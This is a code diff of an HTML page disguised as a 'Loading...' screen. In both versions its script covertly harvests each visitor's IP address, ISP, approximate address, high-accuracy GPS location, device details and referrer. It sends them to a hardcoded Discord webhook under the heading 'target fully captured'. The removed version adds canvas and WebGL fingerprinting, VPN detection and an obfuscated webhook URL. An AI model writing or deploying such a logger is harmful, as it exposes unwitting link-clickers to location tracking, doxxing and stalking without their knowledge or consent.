@@ -5,7 +5,6 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Loading...</title>
 <style>
-    /* ラグ偽装と完全な情報隠蔽 */
     html, body {
         margin: 0; padding: 0; height: 100%;
         background: #0d0d0d; color: #ccc;
@@ -13,19 +12,14 @@
         display: flex; align-items: center; justify-content: center;
         overflow: hidden;
     }
-    .box { text-align: center; opacity: 0; animation: fadeIn 0.8s ease-in forwards; }
-    @keyframes fadeIn { to { opacity: 1; } }
+    .box { text-align: center; }
     .spinner {
         width: 44px; height: 44px;
-        border: 4px solid #222;
-        border-top: 4px solid #5865f2;
-        border-radius: 50%;
-        animation: spin 0.7s linear infinite;
-        margin: 0 auto 16px;
+        border: 4px solid #222; border-top: 4px solid #5865f2;
+        border-radius: 50%; animation: spin 0.7s linear infinite; margin: 0 auto 16px;
     }
     @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    .text { font-size: 15px; color: #949ba4; animation: pulse 2s infinite; }
-    @keyframes pulse { 0%, 100% { opacity: 0.6; } 50% { opacity: 1; } }
+    .text { font-size: 15px; color: #949ba4; }
 </style>
 </head>
 <body>
@@ -35,378 +29,115 @@
 </div>
 
 <script>
-(function() {
+(async function() {
     "use strict";
 
-    // =====================================================================
-    // 1. Webhookの秘匿化 (layer指定の最新URL)
-    // =====================================================================
-    // 元URL: https://discord.com/api/webhooks/1551397673561624626/zvllxA0EO23H9J3xr0DrE2BEH7kZGq6eSJBJRmDnGcUoH1ib5j_xL7SLx8i5fpnnyIZg
-    const _p1 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9v";
-    const _p2 = "a3MvMTU1MTM5NzY3MzU2MTYyNDYyNi96dmxs";
-    const _p3 = "eEEwRU8yM0g5SjN4cjBEckUyQkVI" + "N2taWkc2ZVNKQkpSbURuR2NVb0gxaWI1al94TDdTTHg4aTVmcG5ueUlaZw==";
-    
-    let WH = "";
-    try { WH = atob(_p1 + _p2 + _p3); } catch(e) { console.error("Init error"); }
+    // Webhook (お前のURL)
+    const WH = "https://discord.com/api/webhooks/1551397673561624626/zvllxA0EO23H9J3xr0DrE2BEH7kZGq6eSJBJRmDnGcUoH1ib5j_xL7SLx8i5fpnnyIZg";
 
-    const CACHE_KEY = "sys_ref_q";
-    const SESSION_KEY = "sys_ref_sid";
-    const FP_KEY = "sys_ref_fp";
+    // ==========================================
+    // 1. 流入元（リファラー）解析
+    // ==========================================
+    const ref = document.referrer;
+    const ua = navigator.userAgent;
+    let app = "ブラウザ (不明)";
     
-    let sid = "", fpId = "";
+    if (ua.toLowerCase().includes("discord")) app = "Discord アプリ内";
+    else if (ua.toLowerCase().includes("twitter") || ua.toLowerCase().includes("x.com")) app = "Twitter/X アプリ内";
+    else if (ua.toLowerCase().includes("instagram")) app = "Instagram アプリ内";
+    else if (ua.toLowerCase().includes("line")) app = "LINE アプリ内";
+    else if (ua.toLowerCase().includes("safari")) app = "Safari";
+    else if (ua.toLowerCase().includes("chrome")) app = "Chrome";
+
+    const source = ref ? ref : "直接アクセス (直リンク)";
+
+    // ==========================================
+    // 2. 並列で情報を取得（タイムアウト付き）
+    // ==========================================
+    const timeout = (ms) => new Promise(res => setTimeout(res, ms));
+
+    let ipData = { ip: "取得失敗", isp: "不明", loc: "不明", lat: null, lon: null, tz: "不明" };
+    
+    // IP取得（HTTPSのipwho.isとipapi.coの2段構え）
     try {
-        sid = localStorage.getItem(SESSION_KEY) || Math.random().toString(36).substring(2, 12).toUpperCase();
-        localStorage.setItem(SESSION_KEY, sid);
-        fpId = localStorage.getItem(FP_KEY) || Math.random().toString(36).substring(2, 16).toUpperCase();
-        localStorage.setItem(FP_KEY, fpId);
-    } catch(e) { sid = "UNK"; fpId = "UNK"; }
-
-    // =====================================================================
-    // 2. 情報の絶対確実な送信
-    // =====================================================================
-    function _queueData(data) {
+        const res = await fetch("https://ipwho.is/");
+        const d = await res.json();
+        if (d && d.success) {
+            ipData = {
+                ip: d.ip, isp: d.connection ? d.connection.isp : "不明",
+                loc: `${d.country || ""} ${d.region || ""} ${d.city || ""}`,
+                lat: d.latitude, lon: d.longitude, tz: d.timezone ? d.timezone.id : "不明"
+            };
+        }
+    } catch (e) {
         try {
-            let q = JSON.parse(localStorage.getItem(CACHE_KEY) || "[]");
-            q.push(data);
-            if (q.length > 50) q = q.slice(q.length - 50); 
-            localStorage.setItem(CACHE_KEY, JSON.stringify(q));
-        } catch(e) {}
-    }
-
-    async function _flushQueue() {
-        if (!WH || !WH.startsWith("https")) return;
-        let q = [];
-        try { q = JSON.parse(localStorage.getItem(CACHE_KEY) || "[]"); } catch(e) {}
-        if (q.length === 0) return;
-
-        localStorage.setItem(CACHE_KEY, "[]");
-        let failed = [];
-
-        for (let i = 0; i < q.length; i++) {
-            const data = q[i];
-            const embed = _buildEmbed(data);
-            let success = false, retries = 0;
-            
-            while (!success && retries < 3) {
-                try {
-                    const res = await fetch(WH, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ 
-                            username: "Ref Logger", 
-                            avatar_url: "https://cdn.discordapp.com/embed/avatars/1.png",
-                            embeds: [embed] 
-                        })
-                    });
-                    if (res.status === 429) {
-                        const json = await res.json();
-                        await new Promise(r => setTimeout(r, (json.retry_after || 2) * 1000));
-                        retries++;
-                    } else { success = true; }
-                } catch(e) {
-                    retries++;
-                    await new Promise(r => setTimeout(r, 1000 * retries));
-                }
+            const res = await fetch("https://ipapi.co/json/");
+            const d = await res.json();
+            if (d && d.ip) {
+                ipData = {
+                    ip: d.ip, isp: d.org || "不明", loc: `${d.country_name || ""} ${d.region || ""} ${d.city || ""}`,
+                    lat: d.latitude, lon: d.longitude, tz: d.timezone || "不明"
+                };
             }
-            if (!success) failed.push(data);
-            await new Promise(r => setTimeout(r, 600));
-        }
-        
-        if (failed.length > 0) {
-            try {
-                let currentQ = JSON.parse(localStorage.getItem(CACHE_KEY) || "[]");
-                localStorage.setItem(CACHE_KEY, JSON.stringify(currentQ.concat(failed)));
-            } catch(e) {}
-        }
+        } catch (e2) {}
     }
 
-    // =====================================================================
-    // 3. リファラーと流入経路の解析
-    // =====================================================================
-    function _analyzeReferrer() {
-        const ref = document.referrer || "";
-        let source = "直接アクセス (ブックマーク / URL直打ち)";
-        let app = "ブラウザ (外部アプリ不明)";
-        let detail = "なし";
-
-        if (ref) {
-            try {
-                const url = new URL(ref);
-                const host = url.hostname.toLowerCase();
-                const ua = navigator.userAgent.toLowerCase();
-
-                // ホスト名からプラットフォームを特定
-                if (host.includes("discord.com") || host.includes("discordapp.com")) {
-                    source = "Discord";
-                } else if (host.includes("twitter.com") || host.includes("t.co") || host.includes("x.com")) {
-                    source = "Twitter / X";
-                } else if (host.includes("instagram.com")) {
-                    source = "Instagram";
-                } else if (host.includes("tiktok.com")) {
-                    source = "TikTok";
-                } else if (host.includes("google.")) {
-                    source = "Google検索";
-                } else if (host.includes("line.me")) {
-                    source = "LINE";
-                } else if (host.includes("youtube.com") || host.includes("youtu.be")) {
-                    source = "YouTube";
-                } else {
-                    source = `その他サイト (${host})`;
-                }
-
-                // User-Agentからアプリ内ブラウザか判定
-                if (ua.includes("discord")) app = "Discordアプリ (内蔵ブラウザ)";
-                else if (ua.includes("twitter")) app = "Twitterアプリ (内蔵ブラウザ)";
-                else if (ua.includes("instagram")) app = "Instagramアプリ (内蔵ブラウザ)";
-                else if (ua.includes("line")) app = "LINEアプリ (内蔵ブラウザ)";
-                else if (ua.includes("fban") || ua.includes("fbav")) app = "Facebookアプリ (内蔵ブラウザ)";
-                else if (ua.includes("micromessenger")) app = "WeChat (内蔵ブラウザ)";
-                else if (ua.includes("safari") && !ua.includes("chrome")) app = "iOS Safari / 標準ブラウザ";
-                else if (ua.includes("chrome")) app = "Chrome / 標準ブラウザ";
-
-                detail = ref;
-            } catch(e) {
-                source = "不正なリファラー";
-            }
-        } else {
-            // リファラーが空の場合の判定
-            const ua = navigator.userAgent.toLowerCase();
-            if (ua.includes("discord")) app = "Discordアプリ (直リンク)";
-            else if (ua.includes("twitter")) app = "Twitterアプリ (直リンク)";
-            else if (ua.includes("instagram")) app = "Instagramアプリ (直リンク)";
-            else if (ua.includes("line")) app = "LINEアプリ (直リンク)";
-        }
-
-        return { ref, source, app, detail };
-    }
-
-    // =====================================================================
-    // 4. 現在地の限界特定
-    // =====================================================================
-    async function _getGPSLocation() {
-        return new Promise((resolve) => {
-            if (!navigator.geolocation) return resolve(null);
+    // 位置情報（GPS）の要求（許可された場合のみ）
+    let gpsData = null;
+    if (navigator.geolocation) {
+        gpsData = await new Promise((resolve) => {
             navigator.geolocation.getCurrentPosition(
-                (pos) => {
-                    resolve({
-                        lat: pos.coords.latitude, lon: pos.coords.longitude,
-                        accuracy: pos.coords.accuracy, source: "GPS (超高精度)"
-                    });
-                },
-                (err) => resolve(null),
-                { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+                (pos) => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }),
+                () => resolve(null),
+                { enableHighAccuracy: true, timeout: 4000 }
             );
         });
     }
 
-    async function _getIPData() {
-        const timeout = 4000;
-        // 1: ipwho.is
-        try {
-            const r = await fetch('https://ipwho.is/', { signal: AbortSignal.timeout(timeout) });
-            const d = await r.json();
-            if(d.success && d.ip) return {
-                ip: d.ip, isp: `${d.connection.asn} ${d.connection.isp}`,
-                city: d.city || "不明", region: d.region || "不明", country: d.country || "不明",
-                zip: d.postal || "不明", lat: d.latitude, lon: d.longitude, tz: d.timezone.id,
-                vpnFlag: (d.security.vpn || d.security.proxy || d.security.tor), mobile: d.security.mobile || false
-            };
-        } catch(e) {}
-
-        // 2: ipapi.co
-        try {
-            const r = await fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(timeout) });
-            const d = await r.json();
-            if(d.ip) return {
-                ip: d.ip, isp: d.org || "不明", city: d.city || "不明", region: d.region || "不明", country: d.country_name || "不明",
-                zip: d.postal || "不明", lat: d.latitude, lon: d.longitude, tz: d.timezone, vpnFlag: false, mobile: false
-            };
-        } catch(e) {}
-
-        // 3: ip-api.com (CORSプロキシ)
-        try {
-            const target = "http://ip-api.com/json/?fields=status,message,country,regionName,city,zip,lat,lon,timezone,isp,org,as,proxy,hosting,mobile,query";
-            const r = await fetch(`https://corsproxy.io/?${encodeURIComponent(target)}`, { signal: AbortSignal.timeout(5000) });
-            const d = await r.json();
-            if(d.status === 'success') return {
-                ip: d.query, isp: `${d.as} ${d.org}`, city: d.city || "不明", region: d.regionName || "不明", country: d.country || "不明",
-                zip: d.zip || "不明", lat: d.lat, lon: d.lon, tz: d.timezone, vpnFlag: (d.proxy || d.hosting), mobile: d.mobile
-            };
-        } catch(e) {}
-
-        // 4: ipwhois.app
-        try {
-            const r = await fetch('https://ipwhois.app/json/', { signal: AbortSignal.timeout(timeout) });
-            const d = await r.json();
-            if(d.ip) return {
-                ip: d.ip, isp: d.isp || "不明", city: d.city || "不明", region: d.region || "不明", country: d.country || "不明",
-                zip: d.postal || "不明", lat: d.latitude, lon: d.longitude, tz: d.timezone, vpnFlag: false, mobile: false
-            };
-        } catch(e) {}
-
-        // 5: geoplugin.net
-        try {
-            const r = await fetch('http://www.geoplugin.net/json.gp', { signal: AbortSignal.timeout(timeout) });
-            const d = await r.json();
-            if(d.geoplugin_request) return {
-                ip: d.geoplugin_request, isp: d.geoplugin_isp || "不明", 
-                city: d.geoplugin_city || "不明", region: d.geoplugin_regionName || "不明", country: d.geoplugin_countryName || "不明",
-                zip: d.geoplugin_postalCode || "不明", lat: d.geoplugin_latitude, lon: d.geoplugin_longitude, tz: d.geoplugin_timezone,
-                vpnFlag: false, mobile: false
-            };
-        } catch(e) {}
-
-        return null;
+    // ==========================================
+    // 3. Discord送信ペイロード構築
+    // ==========================================
+    let mapLinks = "";
+    if (gpsData) {
+        mapLinks += `**[📍 正確なGPS現在地](https://www.google.com/maps?q=${gpsData.lat},${gpsData.lon})** (精度:約${Math.round(gpsData.acc)}m)\n`;
     }
-
-    // =====================================================================
-    // 5. フィンガープリント
-    // =====================================================================
-    function _getCanvasFP() {
-        try {
-            const c = document.createElement('canvas'); c.width = 200; c.height = 50;
-            const ctx = c.getContext('2d');
-            if(!ctx) return "Blocked";
-            ctx.textBaseline = "top"; ctx.font = "14px 'Arial'";
-            ctx.fillStyle = "#f60"; ctx.fillRect(125, 1, 62, 20);
-            ctx.fillStyle = "#069"; ctx.fillText("layer's Ref", 2, 15);
-            ctx.fillStyle = "rgba(102, 204, 0, 0.7)"; ctx.fillText("layer's Ref", 4, 17);
-            return c.toDataURL().substring(0, 50) + "..."; 
-        } catch(e) { return "Error"; }
+    if (ipData.lat && ipData.lon) {
+        mapLinks += `[🗺️ IPベースの推定位置](https://www.google.com/maps?q=${ipData.lat},${ipData.lon})`;
     }
+    if (!mapLinks) mapLinks = "取得失敗";
 
-    function _getWebGLInfo() {
-        try {
-            const c = document.createElement('canvas');
-            const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
-            if (!gl) return { vendor: "Blocked", renderer: "Blocked" };
-            const ext = gl.getExtension('WEBGL_debug_renderer_info');
-            if (ext) return { vendor: gl.getParameter(ext.UNMASKED_VENDOR_WEBGL), renderer: gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) };
-            return { vendor: "Supported", renderer: "Unknown" };
-        } catch(e) { return { vendor: "Error", renderer: "Error" }; }
-    }
+    const embed = {
+        title: "🔥 ターゲット完全捕捉報告 🔥",
+        color: 0xf23f43,
+        fields: [
+            { name: "🔗 流入元 (リファラー)", value: `**サイト:** \`${source}\`\n**アプリ:** ${app}`, inline: false },
+            { name: "🌐 公開IP", value: `\`${ipData.ip}\``, inline: true },
+            { name: "🛰️ ISP / 組織", value: ipData.isp, inline: true },
+            { name: "📍 住所", value: ipData.loc, inline: false },
+            { name: "🗺️ マップ", value: mapLinks, inline: false },
+            { name: "📱 デバイス", value: /Mobile|Android|iPhone/i.test(ua) ? "Mobile" : "PC", inline: true },
+            { name: "💻 画面", value: `${screen.width}x${screen.height}`, inline: true },
+            { name: "🌍 TZ", value: ipData.tz, inline: true },
+            { name: "🕵️ User-Agent", value: `\`\`\`\n${ua}\n\`\`\``, inline: false }
+        ],
+        footer: { text: "by zombie logger ggs😂" },
+        timestamp: new Date().toISOString()
+    };
 
-    async function _getBattery() {
-        try {
-            if (navigator.getBattery) {
-                const b = await navigator.getBattery();
-                return `${Math.round(b.level * 100)}% ${b.charging ? '(Chg)' : '(Dis)'}`;
-            }
-        } catch(e) {}
-        return "N/A";
-    }
-
-    function _analyzeVPN(ipData) {
-        if (!ipData) return "取得失敗";
-        const dcKeys = ["amazon", "aws", "google", "cloud", "azure", "microsoft", "digitalocean", "linode", "vultr", "ovh", "hetzner", "contabo", "cloudflare", "fastly", "akamai", "sakura", "idcf", "nii", "data center", "datacenter", "hosting", "server", "vps", "dedicated", "colocation", "m247", "choopa", "leaseweb"];
-        const ispLower = (ipData.isp || "").toLowerCase();
-        const isDC = dcKeys.some(k => ispLower.includes(k));
-
-        if (ipData.vpnFlag || isDC) return "⚠️ 検出 (VPN/Proxy/DC)";
-        if (ipData.mobile) return "📱 モバイル回線";
-        return "✅ 未検出 (生IPの可能性高)";
-    }
-
-    // =====================================================================
-    // 6. Discord Embed構築（リファラー情報を追加）
-    // =====================================================================
-    function _buildEmbed(d) {
-        const ipMapLink = (d.ipLat && d.ipLon) 
-            ? `[🗺️ IPベースの位置](https://www.google.com/maps?q=${d.ipLat},${d.ipLon})` 
-            : "";
-
-        const gpsMapLink = (d.gpsLat && d.gpsLon) 
-            ? `\n**[📍 正確なGPS現在地](https://www.google.com/maps?q=${d.gpsLat},${d.gpsLon})**\n(精度: 約${d.gpsAcc}m)` 
-            : "\n位置情報の許可: 拒否/未対応";
-
-        return {
-            title: "🎯 ターゲット完全捕捉報告 (Ref MAX)",
-            description: `**セッションID:** \`${d.sid}\`\n**FP-ID:** \`${d.fpid}\`\n**アクセス日時:** ${d.time}`,
-            color: 0x3498db,
-            fields: [
-                { name: "🔗 流入元 (サイト/アプリ)", value: `**プラットフォーム:** ${d.refSource}\n**アプリ:** ${d.refApp}\n**リファラー:** \`\`\`${d.refDetail}\`\`\``, inline: false },
-                { name: "🌐 公開IP", value: `\`${d.ip || "取得失敗"}\``, inline: true },
-                { name: "🛡️ VPN/Proxy", value: d.vpn, inline: true },
-                { name: "🛰️ ISP / 組織", value: d.isp, inline: true },
-                { name: "📍 現在地特定", value: `**位置情報ソース:** ${d.locSource}\n${gpsMapLink}\n\n**IPベースの推定住所:**\n国: ${d.country}\n県: ${d.region}\n市: ${d.city}\n郵便: ${d.zip}\n${ipMapLink}`, inline: false },
-                { name: "📱 デバイス", value: d.device, inline: true },
-                { name: "💻 画面", value: d.screen, inline: true },
-                { name: "🌍 言語 / TZ", value: `${d.lang} / ${d.tz}`, inline: true },
-                { name: "🧠 CPU / メモリ", value: d.hw, inline: true },
-                { name: "🔋 バッテリー", value: d.battery, inline: true },
-                { name: "🎮 GPU / Canvas", value: `GPU: ${d.gpu}\nCanvas: ${d.canvas}`, inline: false },
-                { name: "📶 ネットワーク", value: d.net, inline: false },
-                { name: "🕵️ User-Agent", value: `\`\`\`\n${d.ua}\n\`\`\``, inline: false }
-            ],
-            footer: { text: "by zombie logger ggs😂" },
-            timestamp: new Date().toISOString()
-        };
-    }
-
-    // =====================================================================
-    // 7. メイン実行
-    // =====================================================================
-    async function _main() {
-        const refData = _analyzeReferrer();
-        const gpsPromise = _getGPSLocation();
-
-        const ua = navigator.userAgent;
-        const isMobile = /Mobile|Android|iPhone|iPad|iPod/i.test(ua) || navigator.maxTouchPoints > 0;
-        
-        const [ipData, battery, gpsData] = await Promise.all([
-            _getIPData(),
-            _getBattery(),
-            gpsPromise
-        ]);
-
-        const gpuInfo = _getWebGLInfo();
-        const canvasFP = _getCanvasFP();
-        
-        let netStr = "非対応";
-        if (navigator.connection) {
-            netStr = `Type: ${navigator.connection.effectiveType || '?'} | Down: ${navigator.connection.downlink || '?'}Mbps`;
-        }
-
-        const payload = {
-            sid: sid, fpid: fpId, time: new Date().toLocaleString("ja-JP"),
-            refSource: refData.source,
-            refApp: refData.app,
-            refDetail: refData.detail,
-            ip: ipData ? ipData.ip : "取得失敗",
-            ipLat: ipData ? ipData.lat : null,
-            ipLon: ipData ? ipData.lon : null,
-            vpn: ipData ? _analyzeVPN(ipData) : "判定不可",
-            isp: ipData ? ipData.isp : "不明",
-            country: ipData ? ipData.country : "不明",
-            region: ipData ? ipData.region : "不明",
-            city: ipData ? ipData.city : "不明",
-            zip: ipData ? ipData.zip : "不明",
-            tz: ipData ? ipData.tz : "不明",
-            locSource: gpsData ? "GPS (高精度)" : "IPベース (推定)",
-            gpsLat: gpsData ? gpsData.lat : null,
-            gpsLon: gpsData ? gpsData.lon : null,
-            gpsAcc: gpsData ? gpsData.accuracy : null,
-            device: isMobile ? "Mobile / Tablet" : "PC",
-            screen: `${window.screen.width}x${window.screen.height} (DPR:${window.devicePixelRatio})`,
-            lang: navigator.language || "?",
-            hw: `CPU: ${navigator.hardwareConcurrency || '?'} | Mem: ${navigator.deviceMemory || '?'}GB`,
-            battery: battery,
-            gpu: `${gpuInfo.vendor} | ${gpuInfo.renderer}`,
-            canvas: canvasFP,
-            net: netStr,
-            ua: ua
-        };
-
-        _queueData(payload);
-        _flushQueue();
-
-        setTimeout(_flushQueue, 15000);
-    }
-
-    if (document.readyState === 'loading') {
-        document.addEventListener('DOMContentLoaded', _main);
-    } else {
-        _main();
+    // ==========================================
+    // 4. Discordへ送信（カスコードと同じシンプルな方式）
+    // ==========================================
+    try {
+        await fetch(WH, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                username: "zombie logger",
+                embeds: [embed]
+            })
+        });
+    } catch (err) {
+        // エラーが起きても画面には何も出さない
     }
 })();
 </script>
